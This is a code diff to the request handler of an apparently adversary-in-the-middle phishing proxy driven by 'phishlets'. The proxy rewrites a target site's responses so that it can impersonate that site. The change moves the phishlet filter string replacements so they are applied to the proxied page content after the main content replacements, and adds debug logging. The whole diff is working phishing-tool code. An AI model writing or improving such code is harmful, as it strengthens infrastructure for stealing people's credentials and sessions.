@@ -2855,10 +2855,7 @@ async def proxy_handler(request):
                         local_map[target_host] = incoming_host
                         debug_log(f"  Main target mapping (added last): {target_host} -> {incoming_host}", "DEBUG")
                         
-                        # Add mapping for string replacement from filters using helper function
-                        request_path = str(request.url.path)
-                        filter_replacements = process_phishlet_filters(current_phishlet_data, request_path, debug_log)
-                        local_map.update(filter_replacements)
+                        # Filter replacements will be processed after content replacements
                         
                         # Use only the current phishlet's mappings
                         filtered_map = local_map
@@ -3078,6 +3075,18 @@ async def proxy_handler(request):
                                 chunk_count, 
                                 debug_log
                             )
+                            
+                            # Process phishlet filters after content replacements
+                            if current_phishlet_data:
+                                request_path = str(request.url.path)
+                                filter_replacements = process_phishlet_filters(current_phishlet_data, request_path, debug_log)
+                                if filter_replacements:
+                                    # Apply filter replacements directly to the content
+                                    for old_text, new_text in filter_replacements.items():
+                                        if old_text in combined:
+                                            combined = combined.replace(old_text, new_text)
+                                            debug_log(f"Applied filter replacement: '{old_text}' -> '{new_text}'", "DEBUG")
+                                    debug_log(f"Applied {len(filter_replacements)} filter replacements after content replacements", "DEBUG")
                         if is_static_file and chunk_count == 1:
                             debug_log(f"⏭️  CONTENT REPLACEMENT SKIPPED for static file: {url_path}", "DEBUG")
                             debug_log(f"   This is expected behavior for static files", "DEBUG")
